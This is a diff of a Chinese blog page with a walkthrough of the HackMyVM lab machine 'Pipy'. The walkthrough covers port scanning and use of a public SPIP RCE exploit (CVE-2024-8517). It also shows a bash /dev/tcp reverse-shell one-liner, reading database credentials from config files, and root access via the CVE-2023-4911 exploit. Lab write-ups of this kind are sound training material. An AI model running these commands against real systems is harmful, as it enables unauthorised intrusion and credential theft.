@@ -1146,13 +1146,13 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>hmv_Pipy</h1>
 <h1>0.简介</h1>
-<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=Pipy">hackmyvm - Pipy</a>
-<strong>难度</strong>：绿色
-<strong>目标 IP</strong>：192.168.205.143
+<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=Pipy" rel="nofollow">hackmyvm - Pipy</a><br>
+<strong>难度</strong>：绿色<br>
+<strong>目标 IP</strong>：192.168.205.143<br>
 <strong>本机 IP</strong>：192.168.205.141</p>
 <h1>1.扫描</h1>
-<p><code>nmap</code>起手</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
+<p><code class="notranslate">nmap</code>起手</p>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 10:33 CST
 Nmap scan report for tiny.hmv (192.168.205.143)
@@ -1167,9 +1167,9 @@ Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
 </code></pre>
 <p>先看<strong>80端口</strong>，<strong>22端口</strong>候补</p>
 <h1>2.踩点</h1>
-<p><img src="https://github.com/user-attachments/assets/864afc4f-50bc-4481-9a21-60be11e82b62" alt="Image" /></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/864afc4f-50bc-4481-9a21-60be11e82b62"><img src="https://github.com/user-attachments/assets/864afc4f-50bc-4481-9a21-60be11e82b62" alt="Image" style="max-width: 100%;"></a></p>
 <p>扫描有没有漏洞（不得不说，群里面的web大佬<strong>Anjv-W.</strong>  推荐的扫洞工具就是好用，点赞👍）</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nuclei -u http://192.168.205.143               
 
                      __     _
@@ -1192,15 +1192,15 @@ Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
 [INF] Using Interactsh Server: oast.online
 [CVE-2024-8517] [http] [critical] http://192.168.205.143/spip.ph%70?pag%65=spip_pass&amp;lang=fr
 [waf-detect:apachegeneric] [http] [info] http://192.168.205.143
-[openssh-detect] [tcp] [info] 192.168.205.143:22 [&quot;SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4&quot;]
+[openssh-detect] [tcp] [info] 192.168.205.143:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4"]
 [ssh-password-auth] [javascript] [info] 192.168.205.143:22
 [ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.143:22
-[ssh-server-enumeration] [javascript] [info] 192.168.205.143:22 [&quot;SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4&quot;]
-[ssh-auth-methods] [javascript] [info] 192.168.205.143:22 [&quot;[&quot;publickey&quot;,&quot;password&quot;]&quot;]
-[CVE-2023-48795] [javascript] [medium] 192.168.205.143:22 [&quot;Vulnerable to Terrapin&quot;]
+[ssh-server-enumeration] [javascript] [info] 192.168.205.143:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4"]
+[ssh-auth-methods] [javascript] [info] 192.168.205.143:22 ["["publickey","password"]"]
+[CVE-2023-48795] [javascript] [medium] 192.168.205.143:22 ["Vulnerable to Terrapin"]
 [composer-config:composer.json] [http] [info] http://192.168.205.143/composer.json
 [composer-config:composer.json] [http] [info] http://192.168.205.143/vendor/composer/installed.json
-[metatag-cms] [http] [info] http://192.168.205.143 [&quot;SPIP 4.2.0&quot;]
+[metatag-cms] [http] [info] http://192.168.205.143 ["SPIP 4.2.0"]
 [readme-md] [http] [info] http://192.168.205.143/README.md
 [http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.143
 [http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.143
@@ -1213,14 +1213,14 @@ Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
 [http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.143
 [http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.143
 [http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.143
-[apache-detect] [http] [info] http://192.168.205.143 [&quot;Apache/2.4.52 (Ubuntu)&quot;]
-[spip-detect:spip_version] [http] [info] http://192.168.205.143 [&quot;4.2.0&quot;]
+[apache-detect] [http] [info] http://192.168.205.143 ["Apache/2.4.52 (Ubuntu)"]
+[spip-detect:spip_version] [http] [info] http://192.168.205.143 ["4.2.0"]
 [configuration-listing] [http] [medium] http://192.168.205.143/config/
 </code></pre>
 <p>有一个<a href="https://github.com/Chocapikk/CVE-2024-8517">CVE-2024-8517</a>漏洞，我们利用一下</p>
-<p><img src="https://github.com/user-attachments/assets/7cd77edc-68bf-4898-847d-19a65f300d12" alt="Image" /></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/7cd77edc-68bf-4898-847d-19a65f300d12"><img src="https://github.com/user-attachments/assets/7cd77edc-68bf-4898-847d-19a65f300d12" alt="Image" style="max-width: 100%;"></a></p>
 <p>非授权远程执行更喜欢了🤩</p>
-<pre lang="bash"><code>git clone https://github.com/Chocapikk/CVE-2024-8517.git
+<pre lang="bash" class="notranslate"><code class="notranslate">git clone https://github.com/Chocapikk/CVE-2024-8517.git
 cd CVE-2024-8517
 python3 -m venv env
 source env/bin/activate
@@ -1237,11 +1237,11 @@ deactivate #退出虚拟环境命令
 rm -rf env #删除虚拟环境
 </code></pre>
 <p>成功，但是我们要弹个<strong>反弹shell</strong>回去，因为它这个脚本的shell有限制</p>
-<pre lang="bash"><code>$ bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1&quot;
+<pre lang="bash" class="notranslate"><code class="notranslate">$ bash -c "bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1"
 </code></pre>
 <h1>3. 获得稳定的 Shell</h1>
 <p>获取<strong>反向 shell</strong> 后，通过以下命令获得稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
-<pre lang="bash"><code>script /dev/null -c bash  
+<pre lang="bash" class="notranslate"><code class="notranslate">script /dev/null -c bash  
 ctrl+z  
 stty raw -echo; fg  
 reset xterm  
@@ -1251,7 +1251,7 @@ export SHELL=/bin/bash
 stty rows 59 cols 236
 </code></pre>
 <h1>4.提权</h1>
-<pre lang="bash"><code>www-data@pipy:/var/www/html$ sudo -l
+<pre lang="bash" class="notranslate"><code class="notranslate">www-data@pipy:/var/www/html$ sudo -l
 [sudo] password for www-data: 
 sudo: a password is required
 www-data@pipy:/var/www/html$ ls -la
@@ -1293,7 +1293,7 @@ drwxr-xr-x 11 www-data www-data  4096 Oct  4  2023 ..
 -rw-r--r--  1 www-data www-data    83 Feb 23  2023 remove.txt
 www-data@pipy:/var/www/html/config$ cat connect.php
 &lt;?php
-if (!defined(&quot;_ECRIRE_INC_VERSION&quot;)) return;
+if (!defined("_ECRIRE_INC_VERSION")) return;
 defined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);
 $GLOBALS['spip_connect_version'] = 0.8;
 spip_connect_db('localhost','','root','dbpassword','spip','mysql', 'spip','','');
@@ -1366,7 +1366,7 @@ MariaDB [spip]&gt; select * from spip_auteurs\G
     en_ligne: 2023-10-04 13:50:34
  alea_actuel: 387046876651c39a45bc836.13502903
   alea_futur: 465278670651d6da4349d85.01841245
-       prefs: a:4:{s:7:&quot;couleur&quot;;i:2;s:7:&quot;display&quot;;i:2;s:18:&quot;display_navigation&quot;;s:22:&quot;navigation_avec_icones&quot;;s:3:&quot;cnx&quot;;s:0:&quot;&quot;;}
+       prefs: a:4:{s:7:"couleur";i:2;s:7:"display";i:2;s:18:"display_navigation";s:22:"navigation_avec_icones";s:3:"cnx";s:0:"";}
 cookie_oubli: NULL
       source: spip
         lang: 
@@ -1390,7 +1390,7 @@ cookie_oubli: NULL
     en_ligne: 2023-10-04 17:31:03
  alea_actuel: 1540227024651d7e881c21a5.84797952
   alea_futur: 439334464651da1526dbb90.67439545
-       prefs: a:4:{s:7:&quot;couleur&quot;;i:2;s:7:&quot;display&quot;;i:2;s:18:&quot;display_navigation&quot;;s:22:&quot;navigation_avec_icones&quot;;s:3:&quot;cnx&quot;;s:0:&quot;&quot;;}
+       prefs: a:4:{s:7:"couleur";i:2;s:7:"display";i:2;s:18:"display_navigation";s:22:"navigation_avec_icones";s:3:"cnx";s:0:"";}
 cookie_oubli: 1118839.6HqFdtVwUs3T6+AJRJOdnZG6GFPNzl4/wAh9i0D1bqfjYKMJSG63z4KPzonGgNUHz+NmYNLbcIM83Tilz5NYrlGKbw4/cDDBE1mXohDXwEDagYuW2kAUYeqd8y5XqDogNsLGEJIzn0o=
       source: spip
         lang: fr
@@ -1398,14 +1398,14 @@ cookie_oubli: 1118839.6HqFdtVwUs3T6+AJRJOdnZG6GFPNzl4/wAh9i0D1bqfjYKMJSG63z4KPzo
  backup_cles: 
 2 rows in set (0.000 sec)
 </code></pre>
-<p>切换至<code>angela</code></p>
-<pre lang="bash"><code>www-data@pipy:/var/www/html/config$ su - angela
+<p>切换至<code class="notranslate">angela</code></p>
+<pre lang="bash" class="notranslate"><code class="notranslate">www-data@pipy:/var/www/html/config$ su - angela
 Password: 
 angela@pipy:~$ id
 uid=1000(angela) gid=1000(angela) groups=1000(angela)
 </code></pre>
 <p>继续提权</p>
-<pre lang="bash"><code>angela@pipy:~$ ls -la
+<pre lang="bash" class="notranslate"><code class="notranslate">angela@pipy:~$ ls -la
 total 40
 drwxr-x--- 6 angela angela 4096 Oct 17  2023 .
 drwxr-xr-x 3 root   root   4096 Oct  4  2023 ..
@@ -1530,7 +1530,7 @@ root
 admin
 </code></pre>
 <p>什么都没找到,还没定时任务，不会是<strong>内核提权</strong>吧，尝试一下可不可以使用自动化工具提权</p>
-<pre lang="bash"><code>angela@pipy:/mnt$ cd /tmp/
+<pre lang="bash" class="notranslate"><code class="notranslate">angela@pipy:/mnt$ cd /tmp/
 angela@pipy:/tmp$ wget 192.168.205.141/traitor-386
 --2025-01-18 02:52:07--  http://192.168.205.141/traitor-386
 Connecting to 192.168.205.141:80... connected.
@@ -1585,7 +1585,7 @@ https://github.com/liamg/traitor
 [+] Nothing found to exploit.
 </code></pre>
 <p>不可以，那还是我们自己找吧</p>
-<pre lang="bash"><code>angela@pipy:/tmp$ uname -a
+<pre lang="bash" class="notranslate"><code class="notranslate">angela@pipy:/tmp$ uname -a
 Linux pipy 5.15.0-84-generic #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 angela@pipy:/tmp$ lsb_release -a
 No LSB modules are available.
@@ -1595,7 +1595,7 @@ Release:        22.04
 Codename:       jammy
 </code></pre>
 <p>找一下，发现**<a href="https://github.com/leesh3288/CVE-2023-4911">CVE-2023-4911</a>**可以，但是要用特定的脚本，有些脚本不行</p>
-<pre lang="bash"><code>#kali
+<pre lang="bash" class="notranslate"><code class="notranslate">#kali
 ┌──(kali㉿kali)-[~/test/tmp]
 └─$ wget https://github.com/leesh3288/CVE-2023-4911/archive/refs/heads/main.zip
 ┌──(kali㉿kali)-[~/test/tmp]
@@ -1639,8 +1639,7 @@ try 100
 # id
 uid=0(root) gid=0(root) groups=0(root),1000(angela)
 
-</code></pre>
-</div>
+</code></pre></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
